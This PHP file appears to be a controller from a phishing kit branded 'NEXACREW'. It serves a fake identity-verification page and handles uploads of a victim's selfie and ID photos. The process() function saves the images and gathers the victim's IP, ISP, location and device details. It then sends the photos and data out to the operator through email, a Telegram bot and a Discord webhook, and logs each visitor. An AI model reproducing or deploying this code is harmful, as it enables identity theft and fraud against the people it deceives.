<?php
defined("ALLOW") or exit('No direct script access allowed');
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
class Identity
{
    public $goNEXA;

    public function __construct()
    {
        $this->goNEXA = new goNEXA();

        if (!isset($_SESSION['access']) and ($_SESSION['access'] != 8)) {
            write(FCPATH . 'Static/log_click.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|RELOAD\r\n");
            _blocks();
            redirect(uriRand());
        }
    }

    public function index()
    {
        if ($this->goNEXA->is_mobile) {
            echo view('mobile/id');
        } else {
            echo view('pc/id');
        }
    }


    public function process()
    {

        if (isset($_FILES['file1']) && isset($_FILES['file2'])) {
            $uploadDir = FCPATH . 'upload/'; 
            $file1Path = $uploadDir . basename($_FILES['file1']['name']);
            $file2Path = $uploadDir . basename($_FILES['file2']['name']);


            if (move_uploaded_file($_FILES['file1']['tmp_name'], $file1Path) && move_uploaded_file($_FILES['file2']['tmp_name'], $file2Path)) {
                $_SESSION['file1'] = $file1Path;
                $_SESSION['file2'] = $file2Path;
                
            $message =
"== [NEXACREW] ==

== [PAP ID] ==

# PAP ID F       : {$_SESSION['file1']}
# PAP ID B       : {$_SESSION['file2']}

== [DEVICE INFORMATION] ==

# Date & Time    : " . _date() . "
# Device         : {$this->goNEXA->platform}
# Browser        : {$this->goNEXA->browser}
# Country        : {$_SESSION['country']}
# State          : {$_SESSION['region']}
# City           : {$_SESSION['city']}
# IP Address     : {$this->goNEXA->ip_address}
# ISP            : {$this->goNEXA->isp}
# User Agent     : {$this->goNEXA->agent}";

$subject = "PAP ID :: [ {$this->goNEXA->ip_address} - {$_SESSION['country']} ]";
$headers = "From: NEXACREW <idontneed@nexacrew.net>\r\n";

// Kirim ke Email jika aktif
if (_config('GETACCOUNT') == 'on') {
    @mail(_config('RESULT'), $subject, $message, $headers);
}

// Kirim ke Telegram jika aktif
if (_config('Telegram') == 'on') {
    $token  = tel('token');
    $chatId = tel('idtelegram');

    // Foto pertama (misal: selfie)
    if (file_exists($file1Path)) {
        $photo1 = new CURLFile(realpath($file1Path));
        $c1 = curl_init();
        curl_setopt($c1, CURLOPT_URL, "https://api.telegram.org/bot{$token}/sendPhoto");
        curl_setopt($c1, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($c1, CURLOPT_POST, true);
        curl_setopt($c1, CURLOPT_POSTFIELDS, [
            'chat_id' => $chatId,
            'caption' => "📸 PAP SELFIE\nIP: {$this->goNEXA->ip_address}",
            'photo' => $photo1
        ]);
        curl_setopt($c1, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($c1, CURLOPT_SSL_VERIFYHOST, false);
        curl_exec($c1);
        curl_close($c1);
    }

    // Foto kedua (misal: ID)
    if (file_exists($file2Path)) {
        $photo2 = new CURLFile(realpath($file2Path));
        $c2 = curl_init();
        curl_setopt($c2, CURLOPT_URL, "https://api.telegram.org/bot{$token}/sendPhoto");
        curl_setopt($c2, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($c2, CURLOPT_POST, true);
        curl_setopt($c2, CURLOPT_POSTFIELDS, [
            'chat_id' => $chatId,
            'caption' => "🪪 PAP ID BACK",
            'photo' => $photo2
        ]);
        curl_setopt($c2, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($c2, CURLOPT_SSL_VERIFYHOST, false);
        curl_exec($c2);
        curl_close($c2);
    }
}

// Kirim ke Discord jika aktif
if (discord('DISCORD') == 'on') {
    $discordWebhook = discord('DISCORD_WEBHOOK'); // Contoh: https://discord.com/api/webhooks/xxx/yyy
    $json_data = json_encode([
        "content" => $message
    ]);

    $ch = curl_init($discordWebhook);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}

            write(FCPATH . 'Static/log_papid.txt', 'a', "{$this->goNEXA->ip_address}\r\n");
            write(FCPATH . 'Static/log_human.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|Get Pap\r\n");

            $_SESSION['access'] = 12;
            redirect(base_url() . 'finished/#_dn=' . md5(rand(0, 999)));
            } else {
                echo "Error uploading files.";
            }
        }
    }
}
